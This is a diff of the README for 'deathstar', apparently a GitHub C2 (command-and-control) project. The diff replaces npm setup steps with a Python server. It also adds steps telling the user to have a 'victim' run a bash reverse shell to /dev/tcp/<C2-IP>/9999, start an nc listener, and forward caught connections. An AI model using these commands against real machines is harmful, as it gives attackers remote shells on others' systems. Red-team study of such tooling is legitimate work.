@@ -1,20 +1,30 @@
 # deathstar
 Build and understand c2 infrastructure
 
-![dstar](https://github.com/BwithE/deathstar/assets/144924113/43bdc40d-b4d1-49ad-809a-173be015ebaf)
+![screen](https://github.com/user-attachments/assets/7de184fa-cd0b-4cbf-b701-9f505a77cb2a)
 
 # Download deathstar
 
 ```git clone github.com/bwithe/deathstar```
 
-# Install Dependencies
-
-```sudo bash install-tools.sh```
-
-# Start Node Package Manager
-
-```npm start```
+# Start C2
+`python3 deathstar.py`
 
 # Open link in web browser
 
-```firefox 127.0.0.1:3000```
+```firefox 127.0.0.1:5000```
+
+# Have Victim connect to C2 
+Linux / MacOS
+
+`bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
+
+# Start your listener 
+`nc -nvlp 4444`
+
+# Forward the connection to another listener
+On the webpage, type the IP of the listening device, and then click forward.
+
+# Catch the connection
+Once you've caught the connection
+
